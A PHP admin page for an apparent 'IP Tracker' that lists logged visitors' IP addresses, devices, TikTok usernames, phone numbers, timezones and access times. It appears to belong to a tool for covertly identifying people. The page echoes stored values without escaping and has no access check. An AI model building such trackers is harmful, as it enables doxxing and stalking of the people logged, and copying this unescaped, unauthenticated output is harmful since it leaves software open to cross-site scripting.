<?php
include 'db.php';
$result = $conn->query("SELECT * FROM logs ORDER BY id DESC");
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>📡 IP Tracker Admin</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        body {
            background-color: #0f0f0f;
            color: #00ff9f;
            font-family: 'Share Tech Mono', monospace;
            padding: 20px;
        }

        h1 {
            color: #00ffc8;
            text-align: center;
            text-shadow: 0 0 5px #00ffc8;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 30px;
            box-shadow: 0 0 15px #00ffc8;
        }

        th, td {
            border: 1px solid #00ffc8;
            padding: 10px;
            text-align: center;
        }

        th {
            background-color: #000;
            color: #00ffc8;
        }

        tr:nth-child(even) {
            background-color: #141414;
        }

        tr:hover {
            background-color: #1e1e1e;
        }

        .footer {
            text-align: center;
            margin-top: 40px;
            font-size: 12px;
            color: #444;
        }
    </style>
</head>
<body>
    <h1>📡 IP TRACKING PANEL</h1>

    <table>
        <thead>
            <tr>
                <th>#</th>
                <th>IP Address</th>
                <th>Device Info</th>
                <th>Username TikTok</th>
                <th>Nomor HP</th>
                <th>Zona Waktu</th>
                <th>Waktu Akses</th>
            </tr>
        </thead>
        <tbody>
            <?php while ($row = $result->fetch_assoc()) { ?>
            <tr>
                <td><?= $row['id'] ?></td>
                <td><?= $row['ip_address'] ?></td>
                <td><?= $row['os_browser'] ?></td>
                <td><?= $row['tiktok_username'] ?? '-' ?></td>
                <td><?= $row['phone_number'] ?? '-' ?></td>
                <td><?= $row['timezone'] ?></td>
                <td><?= $row['access_time'] ?></td>
            </tr>
            <?php } ?>
        </tbody>
    </table>

    <div class="footer">
        &copy; <?= date('Y') ?> - IP Tracker v1.0
    </div>
</body>
</html>
